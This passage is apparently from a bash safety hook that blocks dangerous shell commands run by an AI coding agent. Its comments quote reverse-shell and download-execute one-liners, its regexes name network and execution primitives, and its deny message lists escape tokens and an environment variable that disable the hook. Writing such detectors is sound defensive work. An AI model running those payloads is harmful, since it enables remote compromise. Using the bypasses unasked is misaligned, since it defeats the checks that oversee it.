#  `python3 -c 'import socket,os,pty;…os.dup2…pty.spawn("/bin/sh")'`) and the
# download-execute (`perl -MLWP::Simple -e 'eval get("http://x")'`,
# `python3 -c "import urllib.request;exec(urllib.request.urlopen(u).read())"`).
# Low frequency, top severity — one execution is the whole compromise.
#
# THREE conditions must hold together; any one alone is ordinary work, which is
# what keeps this precise instead of a keyword sweep:
#   (1) an interpreter in COMMAND position carrying a one-liner flag
#       (-e / -E / -c / -r / -M<module>) — a `.py` FILE argument is not enough;
#   (2) at least one LANGUAGE-LEVEL network primitive. Deliberately not `curl` /
#       a URL: shell-level fetching is Pattern 3's job, and keeping these lists
#       language-level is what stops an unrelated `curl` elsewhere on the line
#       from combining with an unrelated `subprocess` to make a false deny;
#   (3) at least one EXECUTION primitive — exec/eval/system/spawn/popen, a dup2
#       or reopen of a std stream onto the socket, or a literal /bin/sh.
# Verified to keep allowing: `python3 -c "import socket; print(socket.gethostname())"`
# (net, no exec), `python3 -c "import subprocess; subprocess.run(['ls'])"` (exec,
# no net), `python3 -c "import urllib.request; urllib.request.urlretrieve(u,'/tmp/f')"`
# (a DOWNLOAD with no execution — exactly the inspect-before-run path §8 tells
# users to take), `perl -pe 's/a/b/'`, `node -e "console.log(1)"`.
# (The command-position anchor that used to live here as REVSH_ONELINER_CMD is
# gone: condition (1) is now expressed by the candidate EXTRACTION below, which
# both anchors and delimits in one pass. Keeping the old regex as a separate
# pre-check would have been a second spelling of the same condition, free to
# drift from the one that actually decides.)
REVSH_NET='socket\.socket|import[[:space:]]+socket|SOCK_STREAM|AF_INET|urlopen|urllib|requests\.get|http\.client|IO::Socket|use[[:space:]]+Socket|sockaddr_in|inet_aton|getprotobyname|LWP|HTTP::Tiny|Net::HTTP|TCPSocket|open-uri|fsockopen|stream_socket_client|curl_exec|file_get_contents|net\.connect|net\.Socket|require\([^A-Za-z0-9]{1,2}(net|http|https|dgram|tls)[^A-Za-z0-9]|https?\.get\(|fetch\('
# `eval` is listed in BOTH its call form and its bare form: perl's
# `eval get("http://…")` and ruby's `eval Net::HTTP.get(…)` have no paren after
# the keyword, and the first probe run missed exactly that (`eval\(` only). The
# bare form is fenced by non-identifier chars on each side so `evaluate` /
# `re_eval` do not match. Same lesson on the node side: the source text is
# `require('net').connect(…)`, never the literal `net.connect`, so the module
# form is matched with the quote character explicit.
REVSH_EXEC='os\.dup2|pty\.spawn|subprocess|os\.system|os\.exec|popen|exec\(|(^|[^A-Za-z_])eval([^A-Za-z_]|$)|shell_exec|passthru|proc_open|IO\.popen|child_process|spawn\(|system\(|qx[{(]|exec[[:space:]]+["'"'"']|open\(STD|>&[[:space:]]*S|reopen|/bin/(sh|bash|zsh|dash)'
# The three conditions are tested INSIDE ONE EXTRACTED ONE-LINER, not across the
# command line (2026-07-28 review). The first version tested each condition
# independently over the whole of NORMALIZED_CMD while its own comment claimed
# cross-contamination was impossible; the review disproved that with two commands
# this corpus itself marks `pass`, joined by `&&`: a python one-liner that only
# prints the hostname (network primitive, no execution) followed by one that only
# runs subprocess (execution, no network) denied together. Worse, neither
# primitive had to come from an interpreter payload at all — a node one-liner
# printing a number, joined to a grep for the literal word urllib and an ls of
# /bin/sh, also denied: the grep supplied the network token and the ls the
# execution one. (Those exact command strings live in the corpus as R4 rows
# rather than here, so this comment cannot drift from what is asserted.)
# A claim in a comment is not a mechanism; the mechanism is that
# each candidate is now a single interpreter invocation — its `-M`/flag tokens
# through the end of its quoted payload — and both primitives must appear within
# that one span.
_revsh_candidates=$(printf '%s' "$UNWRAPPED_CMD" \
  | grep -oE "(${CURLSH_INTERP})([[:space:]]+-[A-Za-z:_]+)*[[:space:]]+-[eErcM][A-Za-z:_]*[[:space:]]*('[^']*'|\"([^\"\\\\]|\\\\.)*\")" || true)
if (( _ncmd_hit == 0 )) && [[ -n "$_revsh_candidates" ]]; then
  while IFS= read -r _cand; do
    [[ -z "$_cand" ]] && continue
    if printf '%s' "$_cand" | grep -qE "$REVSH_NET" && printf '%s' "$_cand" | grep -qE "$REVSH_EXEC"; then
      _ncmd_hit=1
      _ncmd_reason='an interpreter one-liner opens a network connection AND executes (reverse shell / download-execute)'
      _ncmd_rule='interpreter-net-exec'
      break
    fi
  done <<< "$_revsh_candidates"
fi

# One bucket, one escape token. These four patterns are the same §8 clause
# ("execute scripts of unknown origin") reached by different syntax, so they
# share `§8-curl-sh` and `[allow-curl-sh]` rather than multiplying sections a
# user would have to learn separately — the seam-multiplication the 2026-07-27
# audit exists to stop. The REASON line names which shape fired, so telemetry
# and the deny message stay diagnosable.
if (( _ncmd_hit == 1 )); then
  if (( bypass_curlsh == 1 )); then
    hook_record pre-bash-safety bypass-escape-hatch \
      "{\"token\":\"allow-curl-sh\",\"shape\":$(printf '%s' "$_ncmd_rule" | jq -R .)}" \
      '§8-curl-sh' "$SESSION_ID" "$TOOL_USE_ID"
  elif (( curlsh_hit == 0 )); then
    HITS+=("fetch-execute / reverse-shell shape (unknown-origin execution)")
    HIT_SECTIONS+=('§8-curl-sh')
    REASONS+=$'\n  - '"$_ncmd_reason"
  fi
fi

if (( ${#HITS[@]} == 0 )); then
  exit 0
fi

REASON_TEXT="§8 SAFETY (immutable): denied dangerous Bash invocation:${REASONS}

Spec: ~/.claude/CLAUDE.md §8 SAFETY —
  • \"rm -rf \$VAR without validating VAR\" (forbidden)
  • NPX: \"lockfile → local → pinned whitelist; none → [AUTH REQUIRED]\"
    (covers npx / bunx / bun x / npm exec / pnpm dlx / yarn dlx, plus runners
     whose argument is itself remote: deno run <URL|npm:|jsr:>, pip install
     git+…/<artifact URL>, cargo install --git, go run|install …@latest,
     nix run github:…)
  • \"execute scripts of unknown origin\" (forbidden) — a fetch or transport
    (curl/wget/nc/socat/scp/base64 …) whose bytes reach a shell or interpreter,
    incl. sh -c \"\$(curl …)\", socat EXEC:, /dev/tcp, and interpreter one-liners
    that open a socket AND exec

Bypass options:
  (a) Fix the invocation:
      • Validate the var inline:  : \"\${VAR:?must be set}\" && rm -rf \"\$VAR\"
      • Scratch cleanup: create it with mktemp in the SAME command:
        D=\$(mktemp -d) … rm -rf \"\$D\"
      • Pin the package:          npx pkg@1.2.3   /   npx @scope/pkg@1.2.3
      • Use a literal path:       rm -rf /tmp/work-dir
      • Download then inspect:    curl -o s.sh URL && less s.sh && sh s.sh
  (b) Per-command escape token: include [allow-rm-rf-var], [allow-npx-unpinned],
      or [allow-curl-sh] in the command (records as bypass in rule-hits log).
  (c) Disable the hook: DISABLE_PRE_BASH_SAFETY_HOOK=1 (discouraged)."

# v0.23.6 — file the deny telemetry under the granular §8 section(s) that
# triggered it (§8-rm-rf-var / §8-npx), one record per section present with
# that section's own hits, so the doctor's per-section bypass ratio counts
# denies in the denominator. A command mixing both categories emits one record
# each. Falls back to generic §8 only if a hit somehow lacks a section tag.
# Enforcement is identical to pre-fix: hook_deny below blocks regardless of the
# telemetry outcome.
# v0.23.7 portability fix: indexed arrays + plain string accumulators ONLY —
# macOS ships bash 3.2, which has no associative arrays (`declare -A` errors out
# and, worse, aborts the deny path before hook_deny → §8 not enforced on macOS).
# The granular section set is fixed and small, so hardcode the three buckets.
_rmrf_hits=""; _npx_hits=""; _curlsh_hits=""; _other_hits=""
for i in "${!HITS[@]}"; do
  case "${HIT_SECTIONS[$i]:-§8}" in
    '§8-rm-rf-var') _rmrf_hits+="${HITS[$i]}"$'\n' ;;
    '§8-npx')       _npx_hits+="${HITS[$i]}"$'\n' ;;
    '§8-curl-sh')   _curlsh_hits+="${HITS[$i]}"$'\n' ;;
    *)              _other_hits+="${HITS[$i]}"$'\n' ;;
  esac
done
record_section_deny() {  # $1=section  $2=newline-delimited hits blob
  [[ -n "$2" ]] || return 0
  local hj
  hj=$(printf '%s' "$2" | sed '/^$/d' | jq -R . | jq -s .)
  hook_record pre-bash-safety deny "{\"matched\":$hj}" "$1" "$SESSION_ID" "$TOOL_USE_ID"
}
record_section_deny '§8-rm-rf-var' "$_rmrf_hits"
record_section_deny '§8-npx'       "$_npx_hits"
record_section_deny '§8-curl-sh'   "$_curlsh_hits"
record_section_deny '§8'           "$_other_hits"
hook_deny pre-bash-safety "$REASON_TEXT"
